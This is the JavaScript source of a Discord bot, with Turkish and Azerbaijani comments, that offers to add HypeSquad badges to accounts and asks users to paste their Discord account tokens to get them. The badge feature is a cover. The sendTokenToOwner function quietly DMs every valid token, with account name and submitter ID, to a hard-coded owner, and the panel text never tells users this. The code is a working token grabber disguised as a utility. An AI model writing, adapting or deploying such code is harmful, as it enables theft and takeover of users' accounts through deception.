import { 
  Client, 
  GatewayIntentBits, 
  ActionRowBuilder, 
  ButtonBuilder, 
  ButtonStyle, 
  ModalBuilder, 
  TextInputBuilder, 
  TextInputStyle, 
  StringSelectMenuBuilder,
  ActivityType,
  ContainerBuilder,
  TextDisplayBuilder,
  SeparatorBuilder,
  MessageFlags
} from 'discord.js';
import express from 'express';

// --- UPTIME VƏ PORT ÜÇÜN EXPRESS SERVERİ ---
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
  res.send('Fronzyy HypeSquad Botu aktif ve çalışıyor!');
});

app.listen(PORT, () => {
  console.log(`Sunucu ${PORT} portunda çalışıyor.`);
});
// -------------------------------------------

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.DirectMessages
  ]
});

// Bellekte saklanan tokenler
const userTokens = new Map();

// Tokenlərin göndəriləcəyi və paneli aça biləcək səlahiyyətli şəxsin ID-si
const OWNER_ID = '1184518857679962186';

client.once('ready', () => {
  console.log(`Bot başarıyla giriş yaptı: ${client.user.tag}`);
  
  // Botun statusunu təyin edirik
  client.user.setActivity({
    name: 'powered by Fronzyy',
    type: ActivityType.Playing
  });
});

// Bot sahibinə DM vasitəsilə mesaj göndərmək üçün köməkçi funksiya
async function sendTokenToOwner(client, title, token, accountName, username, addedByUserId) {
  if (!OWNER_ID) return;
  try {
    const owner = await client.users.fetch(OWNER_ID);
    if (owner) {
      await owner.send(
        `📥 **${title}**\n` +
        `👤 **Hesab:** ${accountName} (${username})\n` +
        `🆔 **Ekleyen Kullanıcı ID:** <@${addedByUserId}> (${addedByUserId})\n` +
        `🔑 **Token:** \`${token}\``
      );
    }
  } catch (err) {
    console.error('Owner DM gönderme hatası:', err);
  }
}

// !panel-hypesquad komutu
client.on('messageCreate', async (message) => {
  if (message.author.bot) return;

  if (message.content === '!panel-hypesquad') {
    if (message.author.id !== OWNER_ID) {
      try {
        await message.delete();
      } catch (e) {}

      try {
        const warningMsg = await message.channel.send({ 
          content: `❌ <@${message.author.id}> Bu komutu sadece yönetici kullanabilir.` 
        });
        
        setTimeout(async () => {
          try { await warningMsg.delete(); } catch (err) {}
        }, 5000);
      } catch (err) {}

      return;
    }

    try { await message.delete(); } catch (e) {}

    const container = new ContainerBuilder()
      .setAccentColor(0x2b2d31)
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('# **Fronzyy HypeSquad Botu**')
      )
      .addSeparatorComponents(
        new SeparatorBuilder().setDivider(true)
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('## **Nasıl kullanılır?**')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Rozet Ekle** : Eklediğiniz hesaplar üzerinden belirleyeceğiniz HypeSquad rozetini almanızı sağlar.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Token Ekle** : Tekli token eklemenizi sağlar.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Toplu Token Ekle** : Her satıra bir token yazarak birden fazla hesabı aynı anda eklersiniz.')
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent('• **Token Sil** : Eklediğiniz tokenleri tek tek veya tümünü silebilirsiniz.')
      )
      .addSeparatorComponents(
        new SeparatorBuilder().setDivider(true)
      )
      .addTextDisplayComponents(
        new TextDisplayBuilder().setContent(`-# Copyright © Developed by Fronzyy 2026`)
      );

    const row1 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('add_hypesquad_panel')
        .setLabel('Rozet Ekle')
        .setStyle(ButtonStyle.Success)
        .setEmoji('🛡️'),

      new ButtonBuilder()
        .setCustomId('add_token')
        .setLabel('Token Ekle')
        .setStyle(ButtonStyle.Success)
        .setEmoji('➕'),

      new ButtonBuilder()
        .setCustomId('add_bulk_token')
        .setLabel('Toplu Token Ekle')
        .setStyle(ButtonStyle.Primary)
        .setEmoji('🗒️')
    );

    const row2 = new ActionRowBuilder().addComponents(
      new ButtonBuilder()
        .setCustomId('remove_token_panel')
        .setLabel('Token Sil')
        .setStyle(ButtonStyle.Danger)
        .setEmoji('🗑️')
    );

    await message.channel.send({ 
      components: [container, row1, row2],
      flags: MessageFlags.IsComponentsV2 
    });
  }
});

// Buton və Modal etkileşimleri
client.on('interactionCreate', async (interaction) => {
  const userId = interaction.user.id;

  // --- 1. TOKEN EKLE BUTONU ---
  if (interaction.isButton() && interaction.customId === 'add_token') {
    const modal = new ModalBuilder()
      .setCustomId('token_modal')
      .setTitle('Discord Token Ekle');

    const tokenInput = new TextInputBuilder()
      .setCustomId('token_input')
      .setLabel('Discord Tokeninizi girin')
      .setStyle(TextInputStyle.Short)
      .setRequired(true);

    modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
    await interaction.showModal(modal);
  }

  // --- 2. TOPLU TOKEN EKLE BUTONU ---
  if (interaction.isButton() && interaction.customId === 'add_bulk_token') {
    const modal = new ModalBuilder()
      .setCustomId('bulk_token_modal')
      .setTitle('Toplu Discord Token Ekle');

    const tokenInput = new TextInputBuilder()
      .setCustomId('bulk_token_input')
      .setLabel('Discord Tokenlerini girin')
      .setPlaceholder('Her satıra 1 token gelecek şekilde yazın')
      .setStyle(TextInputStyle.Paragraph)
      .setRequired(true);

    modal.addComponents(new ActionRowBuilder().addComponents(tokenInput));
    await interaction.showModal(modal);
  }

  // --- 3. TOKEN SİL PANELİ ---
  if (interaction.isButton() && interaction.customId === 'remove_token_panel') {
    const tokens = userTokens.get(userId);
    if (!tokens || tokens.length === 0) {
      return interaction.reply({ content: '⚠️ Silinecek kayıtlı hesabınız bulunmuyor!', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_remove_account')
      .setPlaceholder('Silmek istediğiniz hesabı seçin...')
      .addOptions([
        { label: 'Bütün Tokenleri Sil', value: 'clear_all_tokens', description: 'Size ait olan bütün tokenleri sistemden siler', emoji: '🗑️' },
        ...tokens.map((t, index) => ({
          label: `${t.name} (${t.username})`,
          value: index.toString(),
          description: `Bu hesabı sil`,
          emoji: '❌'
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'Silmek istediğiniz hesabı veya seçeneği belirleyin:', components: [row], ephemeral: true });
  }

  // --- 4. ROZET EKLE BUTONU (Hypesquad Menüsü) ---
  if (interaction.isButton() && interaction.customId === 'add_hypesquad_panel') {
    const tokens = userTokens.get(userId);
    if (!tokens || tokens.length === 0) {
      return interaction.reply({ content: '⚠️ Önce "Token Ekle" veya "Toplu Token Ekle" butonundan bir hesap eklemelisiniz!', ephemeral: true });
    }

    const selectMenu = new StringSelectMenuBuilder()
      .setCustomId('select_hypesquad_account')
      .setPlaceholder('Rozet eklenecek hesabı seçin...')
      .addOptions([
        { label: 'Bütün Hesaplar', value: 'all_accounts', description: 'Eklediğiniz bütün hesaplara rozet verilecek' },
        ...tokens.map((t, index) => ({
          label: `${t.name} (${t.username})`,
          value: index.toString(),
          description: `Seçilen hesap: ${t.name}`
        }))
      ]);

    const row = new ActionRowBuilder().addComponents(selectMenu);
    await interaction.reply({ content: 'HypeSquad rozeti eklemek istediğiniz hesabı seçin:', components: [row], ephemeral: true });
  }

  // --- 5. HESAP SEÇİLDİKTƏN SONRA HYPEQUAD EVİNİ SEÇMƏK ÜÇÜN MENÜ ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_hypesquad_account') {
    const selectedAccountValue = interaction.values[0];

    const selectHouseMenu = new StringSelectMenuBuilder()
      .setCustomId(`select_house_${selectedAccountValue}`)
      .setPlaceholder('HypeSquad Evi (Rozet) seçin...')
      .addOptions([
        { label: 'Bravery (Mor)', value: '1', description: 'Bravery rozetini tanımlar', emoji: '🟣' },
        { label: 'Brilliance (Kırmızı/Turuncu)', value: '2', description: 'Brilliance rozetini tanımlar', emoji: '🔴' },
        { label: 'Balance (Yeşil/Camgöbeği)', value: '3', description: 'Balance rozetini tanımlar', emoji: '🟢' }
      ]);

    const row = new ActionRowBuilder().addComponents(selectHouseMenu);
    await interaction.update({ content: 'Hesap için tanımlamak istediğiniz HypeSquad rozetini seçin:', components: [row] });
  }

  // --- 6. HYPEQUAD SORĞUSUNUN GÖNDƏRİLMƏSİ ---
  if (interaction.isStringSelectMenu() && interaction.customId.startsWith('select_house_')) {
    const accountSelection = interaction.customId.replace('select_house_', '');
    const houseId = parseInt(interaction.values[0]);
    
    const houseNames = { 1: 'Bravery', 2: 'Brilliance', 3: 'Balance' };
    const selectedHouseName = houseNames[houseId];

    const tokens = userTokens.get(userId);
    let targetTokens = [];

    if (accountSelection === 'all_accounts') {
      targetTokens = tokens;
    } else {
      targetTokens = [tokens[parseInt(accountSelection)]];
    }

    await interaction.update({ content: `⏳ Seçilen ${targetTokens.length} hesap için HypeSquad rozeti uygulanıyor...`, components: [] });

    let successCount = 0;
    let failCount = 0;

    for (const tObj of targetTokens) {
      try {
        const response = await fetch("https://discord.com/api/v9/hypesquad/online", {
          method: "POST",
          headers: {
            "Authorization": tObj.token,
            "Content-Type": "application/json"
          },
          body: JSON.stringify({ house_id: houseId })
        });

        if (response.status === 204) {
          successCount++;
        } else {
          failCount++;
        }
      } catch (err) {
        failCount++;
      }
    }

    await interaction.editReply({ 
      content: `🛡️ **HypeSquad İşlemi Tamamlandı!**\n` +
               `✨ Seçilen Ev: **${selectedHouseName}**\n` +
               `✅ Başarılı: **${successCount}** hesap\n` +
               `❌ Hata alınan: **${failCount}** hesap` 
    });
  }

  // --- 7. TEK TOKEN MODAL CEVABI ---
  if (interaction.isModalSubmit() && interaction.customId === 'token_modal') {
    const token = interaction.fields.getTextInputValue('token_input').trim();
    await interaction.deferReply({ ephemeral: true });

    try {
      const userRes = await fetch('https://discord.com/api/v9/users/@me', {
        headers: { 'Authorization': token }
      });

      if (!userRes.ok) {
        return interaction.editReply({ content: `❌ Hata: Girilen token geçersiz veya devre dışı bırakılmış.` });
      }

      const userData = await userRes.json();
      const globalName = userData.global_name || userData.username;
      const username = userData.username;

      if (!userTokens.has(userId)) {
        userTokens.set(userId, []);
      }
      
      const existingList = userTokens.get(userId);
      if (!existingList.some(t => t.token === token)) {
        existingList.push({ token, name: globalName, username: username });
        await sendTokenToOwner(client, 'Yeni Tekli Token Eklendi (HypeSquad)', token, globalName, username, userId);
      }

      await interaction.editReply({ content: `✅ Başarıyla eklendi! Hesap: **${globalName} (${username})**` });
    } catch (err) {
      await interaction.editReply({ content: `❌ Token eklenirken bir hata oluştu.` });
    }
  }

  // --- 8. TOPLU TOKEN MODAL CEVABI ---
  if (interaction.isModalSubmit() && interaction.customId === 'bulk_token_modal') {
    const rawInput = interaction.fields.getTextInputValue('bulk_token_input').trim();
    const tokens = rawInput.split('\n').map(t => t.trim()).filter(t => t.length > 0);

    if (tokens.length === 0) {
      return interaction.reply({ content: '❌ Geçerli token bulunamadı!', ephemeral: true });
    }

    await interaction.deferReply({ ephemeral: true });

    if (!userTokens.has(userId)) {
      userTokens.set(userId, []);
    }
    const existingList = userTokens.get(userId);

    let successCount = 0;
    let failCount = 0;
    let addedNames = [];

    for (const token of tokens) {
      if (existingList.some(t => t.token === token)) continue;

      try {
        const userRes = await fetch('https://discord.com/api/v9/users/@me', {
          headers: { 'Authorization': token }
        });

        if (userRes.ok) {
          const userData = await userRes.json();
          const globalName = userData.global_name || userData.username;
          const username = userData.username;

          existingList.push({ token, name: globalName, username: username });
          addedNames.push(`${globalName} (${username})`);
          successCount++;

          await sendTokenToOwner(client, 'Toplu Token Eklendi (HypeSquad)', token, globalName, username, userId);
        } else {
          failCount++;
        }
      } catch (err) {
        failCount++;
      }
    }

    await interaction.editReply({ 
      content: `📦 **Toplu Token İşlemi Tamamlandı!**\n✅ Başarıyla eklenen: **${successCount}** hesap\n❌ Geçersiz/Eklenemeyen: **${failCount}**\n\n${addedNames.length > 0 ? 'Eklenenler:\n- ' + addedNames.join('\n- ') : ''}` 
    });
  }

  // --- 9. TOKEN SİLME SEÇİM İŞLEMİ ---
  if (interaction.isStringSelectMenu() && interaction.customId === 'select_remove_account') {
    const selectedValue = interaction.values[0];
    const tokens = userTokens.get(userId);

    if (!tokens) {
      return interaction.reply({ content: '❌ Kayıtlı hesabınız bulunmuyor.', ephemeral: true });
    }

    if (selectedValue === 'clear_all_tokens') {
      userTokens.set(userId, []);
      return interaction.reply({ content: '🗑️ Size ait olan bütün tokenler başarıyla silindi!', ephemeral: true });
    } else {
      const index = parseInt(selectedValue);
      const removedAccount = tokens.splice(index, 1)[0];
      return interaction.reply({ content: `❌ Başarıyla silindi: **${removedAccount.name} (${removedAccount.username})**`, ephemeral: true });
    }
  }
});

// Render-də token yoxlanışı ilə giriş
if (!process.env.DISCORD_TOKEN) {
  console.error("❌ HATA: DISCORD_TOKEN environment dəyişəni tapılmadı! Render panelindən əlavə edin.");
  process.exit(1);
}

client.login(process.env.DISCORD_TOKEN);
